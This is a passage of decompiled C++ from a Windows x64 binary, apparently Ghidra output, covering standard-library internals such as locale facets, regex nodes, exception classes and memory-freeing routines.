  undefined4 local_70;
  undefined4 uStack108;
  undefined4 uStack104;
  undefined4 uStack100;
  longlong local_60;
  void **local_58;
  undefined local_50;
  undefined7 uStack79;
  undefined4 local_40;
  undefined4 uStack60;
  undefined4 uStack56;
  undefined4 uStack52;
  ulonglong local_30;
  
  local_30 = DAT_140017038 ^ (ulonglong)auStack168;
  *(undefined4 *)param_2 = 0;
  *(undefined4 *)((longlong)param_2 + 4) = 0;
  *(undefined4 *)(param_2 + 1) = 0;
  *(undefined4 *)((longlong)param_2 + 0xc) = 0;
  param_2[2] = (void *)0x0;
  param_2[2] = (void *)0x0;
  param_2[3] = (void *)0xf;
  *(undefined *)param_2 = 0;
  local_88 = 1;
  local_58 = param_2;
  if (param_3 != param_4) {
    local_70 = 0;
    uStack108 = 0;
    uStack104 = 0;
    uStack100 = 0;
    local_60 = 0;
    local_80 = param_4;
    local_78 = param_3;
    FUN_140002254((void **)&local_70,(longlong)param_4 - (longlong)param_3,&local_78,
                  (longlong *)&local_80);
    pcVar4 = (char *)CONCAT44(uStack100,uStack104);
    pcVar1 = (char *)CONCAT44(uStack108,local_70);
    std::ctype<char>::tolower((ctype_char_ *)param_1[1],pcVar1,pcVar4);
    (**(code **)(**param_1 + 0x20))(*param_1,&local_50,pcVar1,pcVar4);
    if (param_2 != (void **)&local_50) {
      if ((void *)0xf < param_2[3]) {
        pvVar3 = *param_2;
        pvVar2 = pvVar3;
        if ((0xfff < (longlong)param_2[3] + 1U) &&
           (pvVar2 = *(void **)((longlong)pvVar3 + -8),
           0x1f < (ulonglong)((longlong)pvVar3 + (-8 - (longlong)pvVar2)))) goto LAB_140004deb;
        free(pvVar2);
      }
      param_2[2] = (void *)0x0;
      param_2[3] = (void *)0xf;
      *(undefined *)param_2 = 0;
      memcpy(param_2,&local_50,0x20);
      local_40 = 0;
      uStack60 = 0;
      uStack56 = 0xf;
      uStack52 = 0;
      local_50 = 0;
    }
    if (0xf < CONCAT44(uStack52,uStack56)) {
      pvVar2 = (void *)CONCAT71(uStack79,local_50);
      pvVar3 = pvVar2;
      if ((0xfff < CONCAT44(uStack52,uStack56) + 1) &&
         (pvVar3 = *(void **)((longlong)pvVar2 + -8),
         0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)pvVar3)))) {
LAB_140004deb:
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pvVar3);
    }
    if (pcVar1 != (char *)0x0) {
      pcVar4 = pcVar1;
      if ((0xfff < (ulonglong)(local_60 - (longlong)pcVar1)) &&
         (pcVar4 = *(char **)(pcVar1 + -8), (char *)0x1f < pcVar1 + (-8 - (longlong)pcVar4))) {
                    // WARNING: Subroutine does not return
        _invalid_parameter_noinfo_noreturn();
      }
      free(pcVar4);
    }
  }
  FUN_14000eed0(local_30 ^ (ulonglong)auStack168);
  return;
}



longlong * FUN_140004e50(longlong param_1)

{
  code *pcVar1;
  __uint64 _Var2;
  _Locimp *p_Var3;
  longlong lVar4;
  longlong *plVar5;
  longlong *plVar6;
  _Lockit local_res8 [8];
  longlong *local_res10 [3];
  
  std::_Lockit::_Lockit(local_res8,0);
  plVar5 = DAT_1400177f0;
  local_res10[0] = DAT_1400177f0;
  _Var2 = std::locale::id::operator_unsigned___int64((id *)id_exref);
  lVar4 = *(longlong *)(param_1 + 8);
  if (_Var2 < *(ulonglong *)(lVar4 + 0x18)) {
    plVar6 = *(longlong **)(_Var2 * 8 + *(longlong *)(lVar4 + 0x10));
    if (plVar6 != (longlong *)0x0) goto LAB_140004f08;
  }
  else {
    plVar6 = (longlong *)0x0;
  }
  if (*(char *)(lVar4 + 0x24) == '\0') {
LAB_140004ec4:
    if (plVar6 != (longlong *)0x0) goto LAB_140004f08;
  }
  else {
    p_Var3 = std::locale::_Getgloballocale();
    if (_Var2 < *(ulonglong *)(p_Var3 + 0x18)) {
      plVar6 = *(longlong **)(_Var2 * 8 + *(longlong *)(p_Var3 + 0x10));
      goto LAB_140004ec4;
    }
  }
  plVar6 = plVar5;
  if (plVar5 == (longlong *)0x0) {
    lVar4 = FUN_140009fe4((longlong *)local_res10,param_1);
    plVar6 = local_res10[0];
    if (lVar4 == -1) {
      FUN_14000b474();
      pcVar1 = (code *)swi(3);
      plVar5 = (longlong *)(*pcVar1)();
      return plVar5;
    }
    std::_Facet_Register((_Facet_base *)local_res10[0]);
    (**(code **)(*plVar6 + 8))(plVar6);
    DAT_1400177f0 = plVar6;
  }
LAB_140004f08:
  std::_Lockit::__Lockit(local_res8);
  return plVar6;
}



facet ********** FUN_140004f28(facet *********param_1,undefined8 param_2,uint param_3)

{
  facet ********ppppppppfVar1;
  facet *******pppppppfVar2;
  _Locimp *p_Var3;
  __uint64 _Var4;
  facet **********ppppppppppfVar5;
  facet **********ppppppppppfVar6;
  facet ***********pppppppppppfVar7;
  _Lockit local_res8 [8];
  facet **********local_res10;
  facet **********local_res18;
  
  std::_Lockit::_Lockit(local_res8,0);
  local_res10 = DAT_1400177e8;
  pppppppfVar2 = (facet *******)std::locale::id::operator_unsigned___int64((id *)id_exref);
  ppppppppfVar1 = param_1[1];
  if (pppppppfVar2 < ppppppppfVar1[3]) {
    ppppppppppfVar6 = (facet **********)ppppppppfVar1[2][(longlong)pppppppfVar2];
    if (ppppppppppfVar6 != (facet **********)0x0) goto LAB_140004fe7;
  }
  else {
    ppppppppppfVar6 = (facet **********)0x0;
  }
  if (*(char *)((longlong)ppppppppfVar1 + 0x24) == '\0') {
LAB_140004f9d:
    if (ppppppppppfVar6 != (facet **********)0x0) goto LAB_140004fe7;
  }
  else {
    p_Var3 = std::locale::_Getgloballocale();
    if (pppppppfVar2 < *(facet ********)(p_Var3 + 0x18)) {
      ppppppppppfVar6 =
           *(facet ***********)((longlong)pppppppfVar2 * 8 + *(longlong *)(p_Var3 + 0x10));
      goto LAB_140004f9d;
    }
  }
  ppppppppppfVar6 = local_res10;
  if (local_res10 == (facet **********)0x0) {
    pppppppppppfVar7 = &local_res10;
    _Var4 = std::ctype<char>::_Getcat((facet **)pppppppppppfVar7,(locale *)param_1);
    ppppppppppfVar6 = local_res10;
    if (_Var4 == 0xffffffffffffffff) {
      FUN_14000b474();
      ppppppppppfVar5 = (facet **********)operator_new(0x30);
      ppppppppppfVar6 = (facet **********)0x0;
      if (ppppppppppfVar5 != (facet **********)0x0) {
        ppppppppppfVar5[1] = (facet *********)0x14;
        *ppppppppppfVar5 = (facet *********)std::_Root_node::vftable;
        ppppppppppfVar5[2] = (facet *********)0x0;
        ppppppppppfVar5[3] = (facet *********)0x0;
        *(undefined8 *)((longlong)ppppppppppfVar5 + 0x24) = 0;
        *(undefined4 *)((longlong)ppppppppppfVar5 + 0x2c) = 0;
        ppppppppppfVar6 = ppppppppppfVar5;
      }
      *pppppppppppfVar7 = ppppppppppfVar6;
      pppppppppppfVar7[1] = ppppppppppfVar6;
      *(uint *)(pppppppppppfVar7 + 2) = param_3;
      pppppppppppfVar7[3] = (facet **********)param_1;
      *(uint *)((longlong)pppppppppppfVar7 + 0x24) = ~(param_3 >> 9) & 4;
      *(uint *)(pppppppppppfVar7 + 4) = ~(param_3 >> 3) & 0x100;
      return (facet **********)pppppppppppfVar7;
    }
    local_res18 = local_res10;
    std::_Facet_Register((_Facet_base *)local_res10);
    (*(code *)(*ppppppppppfVar6)[1])(ppppppppppfVar6);
    DAT_1400177e8 = local_res10;
    ppppppppppfVar6 = local_res10;
  }
LAB_140004fe7:
  std::_Lockit::__Lockit(local_res8);
  return ppppppppppfVar6;
}



undefined8 * FUN_140005008(undefined8 *param_1,undefined8 param_2,uint param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  
  puVar1 = (undefined8 *)operator_new(0x30);
  puVar2 = (undefined8 *)0x0;
  if (puVar1 != (undefined8 *)0x0) {
    puVar1[1] = 0x14;
    *puVar1 = std::_Root_node::vftable;
    puVar1[2] = 0;
    puVar1[3] = 0;
    *(undefined8 *)((longlong)puVar1 + 0x24) = 0;
    *(undefined4 *)((longlong)puVar1 + 0x2c) = 0;
    puVar2 = puVar1;
  }
  *param_1 = puVar2;
  param_1[1] = puVar2;
  *(uint *)(param_1 + 2) = param_3;
  param_1[3] = param_2;
  *(uint *)((longlong)param_1 + 0x24) = ~(param_3 >> 9) & 4;
  *(uint *)(param_1 + 4) = ~(param_3 >> 3) & 0x100;
  return param_1;
}



longlong FUN_140005098(longlong param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                      longlong param_5,undefined4 param_6,undefined4 param_7,uint param_8)

{
  undefined uVar1;
  
  uVar1 = 0;
  *(undefined8 *)(param_1 + 8) = 0;
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined8 *)(param_1 + 0x18) = 0;
  *(undefined8 *)(param_1 + 0x20) = 0;
  *(undefined8 *)(param_1 + 0x28) = 0;
  *(undefined8 *)(param_1 + 0x30) = 0;
  *(undefined8 *)(param_1 + 0x38) = 0;
  *(undefined8 *)(param_1 + 0x48) = 0;
  *(undefined8 *)(param_1 + 0x50) = 0;
  *(undefined8 *)(param_1 + 0x58) = 0;
  *(undefined8 *)(param_1 + 0x60) = 0;
  *(undefined8 *)(param_1 + 0x68) = 0;
  *(undefined8 *)(param_1 + 0x70) = 0;
  *(undefined8 *)(param_1 + 0x78) = 0;
  *(void **)(param_1 + 0x80) = (void *)0x0;
  *(undefined8 *)(param_1 + 0x88) = 0;
  *(undefined8 *)(param_1 + 0x90) = 0;
  *(undefined8 *)(param_1 + 0xa0) = param_3;
  *(undefined8 *)(param_1 + 0xa8) = param_2;
  *(longlong *)(param_1 + 0xb0) = param_5;
  *(undefined4 *)(param_1 + 0xb8) = param_7;
  *(uint *)(param_1 + 0xbc) = param_8;
  *(undefined *)(param_1 + 0xc0) = 0;
  *(undefined4 *)(param_1 + 0xc4) = param_6;
  if (((*(byte *)(param_5 + 0xc) & 8) != 0) && ((param_8 & 0x10) == 0)) {
    uVar1 = 1;
  }
  *(undefined *)(param_1 + 200) = uVar1;
  *(undefined8 *)(param_1 + 0xd0) = param_4;
  FUN_140004480((void **)(param_1 + 0x80),(ulonglong)*(uint *)(param_5 + 0x24));
  return param_1;
}



char ** FUN_140005168(char **param_1,char *param_2,char *param_3,char *param_4,uint param_5)

{
  char **ppcVar1;
  uint uVar2;
  undefined4 local_res10 [2];
  char **local_res18;
  
  *param_1 = param_3;
  param_1[1] = param_3;
  param_1[2] = param_4;
  *(undefined4 *)(param_1 + 3) = 0;
  *(undefined4 *)((longlong)param_1 + 0x1c) = 0;
  ppcVar1 = param_1 + 4;
  local_res10[0] = 0;
  *ppcVar1 = (char *)0x0;
  param_1[5] = (char *)0x0;
  param_1[6] = (char *)0x0;
  local_res18 = ppcVar1;
  FUN_140001ffc(ppcVar1,0,local_res10);
  param_1[7] = (char *)0x0;
  FUN_14000b924((longlong *)ppcVar1,0);
  FUN_140005008(param_1 + 8,param_2,param_5);
  param_1[0xd] = param_2;
  *(uint *)(param_1 + 0xe) = param_5;
  uVar2 = param_5 & 0x3f;
  if (uVar2 < 2) {
    *(undefined4 *)(param_1 + 0x10) = 0x8775dfb;
  }
  else {
    if (uVar2 == 2) {
      *(undefined4 *)(param_1 + 0x10) = 0x6e000300;
    }
    else if (uVar2 == 4) {
      *(undefined4 *)(param_1 + 0x10) = 0x7080001b;
    }
    else if (uVar2 == 8) {
      *(undefined4 *)(param_1 + 0x10) = 0x7181a01b;
    }
    else if (uVar2 == 0x10) {
      *(undefined4 *)(param_1 + 0x10) = 0x6e080304;
    }
    else {
      if (uVar2 != 0x20) {
        *(undefined4 *)(param_1 + 0x10) = 0;
        goto LAB_14000525b;
      }
      *(undefined4 *)(param_1 + 0x10) = 0x7088001f;
    }
    FUN_14000b1e8((longlong *)(param_1 + 8));
  }
LAB_14000525b:
  FUN_14000b7d8(param_1);
  return param_1;
}



undefined8 * FUN_140005274(undefined8 *param_1,undefined8 *param_2)

{
  *param_1 = *param_2;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  FUN_1400020cc((void **)(param_1 + 1),(longlong)(param_2[2] - param_2[1]) >> 2,
                (void **)(param_2 + 1),param_2 + 2);
  param_1[4] = param_2[4];
  param_1[5] = (void *)0x0;
  param_1[6] = 0;
  param_1[7] = 0;
  FUN_140002190((void **)(param_1 + 5),param_2[6] - (longlong)param_2[5] >> 4,(void **)(param_2 + 5)
                ,param_2 + 6);
  return param_1;
}



longlong * FUN_140005310(longlong *param_1,longlong *param_2,uint param_3)

{
  int *piVar1;
  int iVar2;
  undefined8 *puVar3;
  _Locimp *p_Var4;
  longlong *plVar5;
  facet **********ppppppppppfVar6;
  longlong *plVar7;
  undefined8 *puVar8;
  
  *param_1 = 0;
  plVar7 = param_2;
  p_Var4 = std::locale::_Init(true);
  param_1[4] = (longlong)p_Var4;
  plVar5 = FUN_140004e50((longlong)(param_1 + 3));
  param_1[1] = (longlong)plVar5;
  ppppppppppfVar6 = FUN_140004f28((facet *********)(param_1 + 3),plVar7,param_3);
  param_1[2] = (longlong)ppppppppppfVar6;
  if (param_1 != param_2) {
    if (*param_1 != 0) {
      LOCK();
      piVar1 = (int *)(*param_1 + 0x2c);
      iVar2 = *piVar1;
      *piVar1 = *piVar1 + -1;
      if (iVar2 == 1) {
        puVar8 = (undefined8 *)*param_1;
        while (puVar8 != (undefined8 *)0x0) {
          puVar3 = (undefined8 *)puVar8[2];
          puVar8[2] = 0;
          (**(code **)*puVar8)(puVar8,1);
          puVar8 = puVar3;
        }
      }
    }
    *param_1 = 0;
    *param_1 = *param_2;
    *param_2 = 0;
  }
  return param_1;
}



longlong * FUN_1400053ac(longlong *param_1,longlong *param_2,uint param_3)

{
  int *piVar1;
  int iVar2;
  longlong lVar3;
  undefined8 *puVar4;
  longlong *plVar5;
  facet **********ppppppppppfVar6;
  longlong *plVar7;
  undefined8 *puVar8;
  
  *param_1 = 0;
  plVar5 = (longlong *)param_2[4];
  param_1[4] = (longlong)plVar5;
  plVar7 = param_2;
  (**(code **)(*plVar5 + 8))();
  plVar5 = FUN_140004e50((longlong)(param_1 + 3));
  param_1[1] = (longlong)plVar5;
  ppppppppppfVar6 = FUN_140004f28((facet *********)(param_1 + 3),plVar7,param_3);
  param_1[2] = (longlong)ppppppppppfVar6;
  lVar3 = *param_2;
  if (lVar3 != 0) {
    LOCK();
    *(int *)(lVar3 + 0x2c) = *(int *)(lVar3 + 0x2c) + 1;
  }
  if (*param_1 != 0) {
    LOCK();
    piVar1 = (int *)(*param_1 + 0x2c);
    iVar2 = *piVar1;
    *piVar1 = *piVar1 + -1;
    if (iVar2 == 1) {
      puVar8 = (undefined8 *)*param_1;
      while (puVar8 != (undefined8 *)0x0) {
        puVar4 = (undefined8 *)puVar8[2];
        puVar8[2] = 0;
        (**(code **)*puVar8)(puVar8,1);
        puVar8 = puVar4;
      }
    }
  }
  *param_1 = lVar3;
  return param_1;
}



longlong * FUN_140005460(longlong *param_1,char *param_2,uint param_3)

{
  _Locimp *p_Var1;
  longlong *plVar2;
  facet **********ppppppppppfVar3;
  longlong lVar4;
  char *pcVar5;
  uint uVar6;
  
  *param_1 = 0;
  pcVar5 = param_2;
  uVar6 = param_3;
  p_Var1 = std::locale::_Init(true);
  param_1[4] = (longlong)p_Var1;
  plVar2 = FUN_140004e50((longlong)(param_1 + 3));
  param_1[1] = (longlong)plVar2;
  ppppppppppfVar3 = FUN_140004f28((facet *********)(param_1 + 3),pcVar5,uVar6);
  param_1[2] = (longlong)ppppppppppfVar3;
  lVar4 = -1;
  do {
    lVar4 = lVar4 + 1;
  } while (param_2[lVar4] != '\0');
  FUN_1400042f8(param_1,param_2,param_2 + lVar4,param_3);
  return param_1;
}



undefined (*) [16] FUN_1400054e8(undefined (*param_1) [16],void *param_2)

{
  undefined *puVar1;
  
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 0;
  puVar1 = (undefined *)0xffffffffffffffff;
  do {
    puVar1 = puVar1 + 1;
  } while (*(char *)((longlong)param_2 + (longlong)puVar1) != '\0');
  FUN_140001d68((void **)param_1,param_2,puVar1);
  return param_1;
}



longlong * FUN_14000551c(longlong *param_1,int param_2)

{
  longlong *this;
  
  if (param_2 != 0) {
    *param_1 = (longlong)&DAT_140011a88;
    param_1[2] = (longlong)&DAT_140011a90;
    std::basic_ios<char,struct_std::char_traits<char>_>::
    basic_ios_char_struct_std__char_traits_char___
              ((basic_ios_char_struct_std__char_traits_char___ *)(param_1 + 0x13));
  }
  this = param_1 + 3;
  std::basic_iostream<char,struct_std::char_traits<char>_>::
  basic_iostream_char_struct_std__char_traits_char___
            ((basic_iostream_char_struct_std__char_traits_char___ *)param_1,
             (basic_streambuf_char_struct_std__char_traits_char___ *)this);
  *(undefined ***)((longlong)*(int *)(*param_1 + 4) + (longlong)param_1) =
       std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
       vftable;
  *(int *)((longlong)*(int *)(*param_1 + 4) + -4 + (longlong)param_1) =
       *(int *)(*param_1 + 4) + -0x98;
  std::basic_streambuf<char,struct_std::char_traits<char>_>::
  basic_streambuf_char_struct_std__char_traits_char___
            ((basic_streambuf_char_struct_std__char_traits_char___ *)this);
  *this = (longlong)
          std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
          vftable;
  param_1[0x10] = 0;
  *(undefined4 *)(param_1 + 0x11) = 0;
  return param_1;
}



longlong ** FUN_1400055c4(longlong **param_1,longlong *param_2)

{
  longlong local_res8;
  longlong local_res10 [3];
  
  local_res8 = param_2[1];
  *param_1 = (longlong *)0x0;
  param_1[1] = (longlong *)0x0;
  param_1[2] = (longlong *)0x0;
  local_res10[0] = *param_2;
  FUN_1400022fc(param_1,(local_res8 - local_res10[0]) / 0x48,local_res10,&local_res8);
  return param_1;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_140005620(undefined8 *param_1,undefined8 *param_2,undefined8 *param_3)

{
  undefined8 *puVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 uVar5;
  void *_Memory;
  undefined auStack152 [32];
  undefined8 *local_78;
  undefined4 uStack112;
  undefined4 uStack108;
  undefined local_68 [16];
  undefined8 local_58;
  undefined8 local_50;
  void *local_48;
  ulonglong local_30;
  ulonglong local_28;
  
  local_28 = DAT_140017038 ^ (ulonglong)auStack152;
  local_58 = 0;
  local_50 = 0;
  puVar1 = param_3 + 2;
  local_68 = ZEXT816(0);
  if (0xf < (ulonglong)param_3[3]) {
    param_3 = (undefined8 *)*param_3;
  }
  local_78 = param_1;
  FUN_140001e44((void **)local_68,param_3,(undefined *)*puVar1);
  local_78 = (undefined8 *)*param_2;
  uStack112 = *(undefined4 *)(param_2 + 1);
  uStack108 = *(undefined4 *)((longlong)param_2 + 0xc);
  local_78 = (undefined8 *)
             FUN_14000a5d0((undefined (*) [16])&local_48,(undefined4 *)&local_78,
                           (basic_string_char_struct_std__char_traits_char__class_std__allocator_char___
                            *)local_68);
  if (0xf < (ulonglong)local_78[3]) {
    local_78 = (undefined8 *)*local_78;
  }
  *param_1 = std::exception::vftable;
  uStack112 = CONCAT31(uStack112._1_3_,1);
  *(undefined (*) [16])(param_1 + 1) = ZEXT816(0);
  __std_exception_copy(&local_78);
  *param_1 = std::runtime_error::vftable;
  if (0xf < local_30) {
    _Memory = local_48;
    if ((0xfff < local_30 + 1) &&
       (_Memory = *(void **)((longlong)local_48 + -8),
       0x1f < (ulonglong)((longlong)local_48 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  uVar2 = *(undefined4 *)param_2;
  uVar3 = *(undefined4 *)((longlong)param_2 + 4);
  uVar4 = *(undefined4 *)(param_2 + 1);
  uVar5 = *(undefined4 *)((longlong)param_2 + 0xc);
  *param_1 = std::_System_error::vftable;
  *(undefined4 *)(param_1 + 3) = uVar2;
  *(undefined4 *)((longlong)param_1 + 0x1c) = uVar3;
  *(undefined4 *)(param_1 + 4) = uVar4;
  *(undefined4 *)((longlong)param_1 + 0x24) = uVar5;
  FUN_14000eed0(local_28 ^ (ulonglong)auStack152);
  return;
}



undefined8 * FUN_140005780(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  *(undefined (*) [16])(param_1 + 1) = ZEXT816(0);
  __std_exception_copy(param_2 + 8);
  *param_1 = std::bad_alloc::vftable;
  return param_1;
}



undefined8 * FUN_1400057f8(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad array new length";
  *param_1 = std::bad_array_new_length::vftable;
  return param_1;
}



undefined8 * FUN_140005818(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  *(undefined (*) [16])(param_1 + 1) = ZEXT816(0);
  __std_exception_copy(param_2 + 8);
  *param_1 = std::bad_cast::vftable;
  return param_1;
}



undefined8 * FUN_140005854(undefined8 *param_1)

{
  param_1[2] = 0;
  param_1[1] = "bad cast";
  *param_1 = std::bad_cast::vftable;
  return param_1;
}



// Library Function - Single Match
//  public: __cdecl std::exception::exception(class std::exception const & __ptr64) __ptr64
// 
// Library: Visual Studio 2019 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined ***)this = vftable;
  *(undefined (*) [16])(this + 8) = ZEXT816(0);
  __std_exception_copy(param_1 + 8);
  return this;
}



void FUN_14000598c(undefined8 *param_1,undefined8 *param_2,void **param_3,char **param_4)

{
  void *_Memory;
  void **ppvVar1;
  undefined auStack136 [32];
  char *local_68;
  char *pcStack96;
  undefined8 *local_58;
  undefined local_50 [16];
  undefined4 local_40;
  undefined4 uStack60;
  undefined4 uStack56;
  undefined4 uStack52;
  ulonglong local_30;
  
  local_30 = DAT_140017038 ^ (ulonglong)auStack136;
  local_68 = *param_4;
  pcStack96 = param_4[1];
  local_58 = param_1;
  FUN_140005620(param_1,&local_68,param_2);
  *param_1 = std::filesystem::filesystem_error::vftable;
  *(undefined (*) [16])(param_1 + 5) = ZEXT816(0);
  param_1[7] = 0;
  param_1[8] = 0;
  ppvVar1 = param_3;
  if ((void *)0x7 < param_3[3]) {
    ppvVar1 = (void **)*param_3;
  }
  FUN_140001f10((void **)(undefined (*) [16])(param_1 + 5),ppvVar1,param_3[2]);
  *(undefined (*) [16])(param_1 + 0xb) = ZEXT816(0);
  *(undefined (*) [16])(param_1 + 9) = ZEXT816(0);
  param_1[0xb] = 0;
  param_1[0xc] = 7;
  *(undefined2 *)(param_1 + 9) = 0;
  local_40 = 0;
  uStack60 = 0;
  uStack56 = 7;
  uStack52 = 0;
  local_50 = ZEXT816(0) & (undefined  [16])0xffffffffffff0000;
  local_68 = "Unknown exception";
  if (param_1[1] != 0) {
    local_68 = (char *)param_1[1];
  }
  pcStack96 = (char *)0xffffffffffffffff;
  do {
    pcStack96 = (char *)((longlong)pcStack96 + 1);
  } while (local_68[(longlong)pcStack96] != '\0');
  FUN_14000acfc((undefined (*) [16])(param_1 + 0xd),&local_68,param_3,(undefined8 *)local_50);
  if (7 < CONCAT44(uStack52,uStack56)) {
    _Memory = local_50._0_8_;
    if ((0xfff < CONCAT44(uStack52,uStack56) * 2 + 2) &&
       (_Memory = *(void **)((longlong)local_50._0_8_ + -8),
       0x1f < (ulonglong)((longlong)local_50._0_8_ + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  FUN_14000eed0(local_30 ^ (ulonglong)auStack136);
  return;
}



undefined8 * FUN_140005acc(undefined8 *param_1,longlong param_2)

{
  *param_1 = std::exception::vftable;
  *(undefined (*) [16])(param_1 + 1) = ZEXT816(0);
  __std_exception_copy(param_2 + 8);
  *param_1 = std::runtime_error::vftable;
  return param_1;
}



longlong ** FUN_140005b08(longlong **param_1,longlong *param_2)

{
  longlong *plVar1;
  bool bVar2;
  
  *param_1 = param_2;
  plVar1 = *(longlong **)((longlong)*(int *)(*param_2 + 4) + 0x48 + (longlong)param_2);
  bVar2 = false;
  if (plVar1 != (longlong *)0x0) {
    (**(code **)(*plVar1 + 8))();
  }
  if (*(int *)((longlong)*(int *)(*param_2 + 4) + 0x10 + (longlong)param_2) == 0) {
    plVar1 = *(longlong **)((longlong)*(int *)(*param_2 + 4) + 0x50 + (longlong)param_2);
    if ((plVar1 == (longlong *)0x0) || (plVar1 == param_2)) {
      bVar2 = true;
    }
    else {
      std::basic_ostream<char,struct_std::char_traits<char>_>::flush
                ((basic_ostream_char_struct_std__char_traits_char___ *)plVar1);
      bVar2 = *(int *)((longlong)*(int *)(*param_2 + 4) + 0x10 + (longlong)param_2) == 0;
    }
  }
  *(bool *)(param_1 + 1) = bVar2;
  return param_1;
}



void FUN_140005be4(undefined8 *param_1,undefined8 *param_2)

{
  void *_Memory;
  undefined auStack104 [32];
  undefined8 *local_48;
  undefined4 uStack64;
  undefined4 uStack60;
  undefined local_38 [16];
  undefined8 local_28;
  ulonglong local_20;
  ulonglong local_18;
  
  local_18 = DAT_140017038 ^ (ulonglong)auStack104;
  local_38 = ZEXT816(0);
  local_28 = 0;
  local_20 = 0xf;
  local_48 = param_1;
  memmove(local_38,&PTR_1400116b8,0);
  local_48 = (undefined8 *)*param_2;
  uStack64 = *(undefined4 *)(param_2 + 1);
  uStack60 = *(undefined4 *)((longlong)param_2 + 0xc);
  FUN_140005620(param_1,&local_48,(undefined8 *)local_38);
  if (0xf < local_20) {
    _Memory = local_38._0_8_;
    if ((0xfff < local_20 + 1) &&
       (_Memory = *(void **)((longlong)local_38._0_8_ + -8),
       0x1f < (ulonglong)((longlong)local_38._0_8_ + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  *param_1 = std::system_error::vftable;
  FUN_14000eed0(local_18 ^ (ulonglong)auStack104);
  return;
}



void FUN_140005cb8(longlong param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *(void **)(param_1 + 8);
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (*(longlong *)(param_1 + 0x18) - (longlong)pvVar1 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *(undefined8 *)(param_1 + 8) = 0;
    *(undefined8 *)(param_1 + 0x10) = 0;
    *(undefined8 *)(param_1 + 0x18) = 0;
  }
  return;
}



void FUN_140005d18(longlong param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *(void **)(param_1 + 0x80);
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (*(longlong *)(param_1 + 0x90) - (longlong)pvVar1 & 0xfffffffffffffff0U)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *(undefined8 *)(param_1 + 0x80) = 0;
    *(undefined8 *)(param_1 + 0x88) = 0;
    *(undefined8 *)(param_1 + 0x90) = 0;
  }
  FUN_140005ed8(param_1 + 0x40);
  FUN_140005ed8(param_1);
  return;
}



void FUN_140005d98(undefined8 *param_1)

{
  void *pvVar1;
  void *pvVar2;
  
  *param_1 = std::_Node_class<char,class_std::regex_traits<char>_>::vftable;
  pvVar2 = (void *)param_1[4];
  while (pvVar2 != (void *)0x0) {
    pvVar1 = *(void **)((longlong)pvVar2 + 0x18);
    free(*(void **)((longlong)pvVar2 + 0x10));
    free(pvVar2);
    pvVar2 = pvVar1;
  }
  free((void *)param_1[5]);
  pvVar2 = (void *)param_1[6];
  if (pvVar2 != (void *)0x0) {
    free(*(void **)((longlong)pvVar2 + 8));
    free(pvVar2);
  }
  pvVar2 = (void *)param_1[7];
  if (pvVar2 != (void *)0x0) {
    free(*(void **)((longlong)pvVar2 + 8));
    free(pvVar2);
  }
  pvVar2 = (void *)param_1[9];
  while (pvVar2 != (void *)0x0) {
    pvVar1 = *(void **)((longlong)pvVar2 + 0x18);
    free(*(void **)((longlong)pvVar2 + 0x10));
    free(pvVar2);
    pvVar2 = pvVar1;
  }
  *param_1 = std::_Node_base::vftable;
  return;
}



void FUN_140005e78(longlong param_1)

{
  void *pvVar1;
  void *_Memory;
  
  pvVar1 = *(void **)(param_1 + 0x20);
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < (*(longlong *)(param_1 + 0x30) - (longlong)pvVar1 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
    *(undefined8 *)(param_1 + 0x20) = 0;
    *(undefined8 *)(param_1 + 0x28) = 0;
    *(undefined8 *)(param_1 + 0x30) = 0;
  }
  return;
}



void FUN_140005ed8(longlong param_1)

{
  void *pvVar1;
  void *pvVar2;
  
  pvVar1 = *(void **)(param_1 + 0x28);
  if (pvVar1 != (void *)0x0) {
    pvVar2 = pvVar1;
    if ((0xfff < (*(longlong *)(param_1 + 0x38) - (longlong)pvVar1 & 0xfffffffffffffff0U)) &&
       (pvVar2 = *(void **)((longlong)pvVar1 + -8),
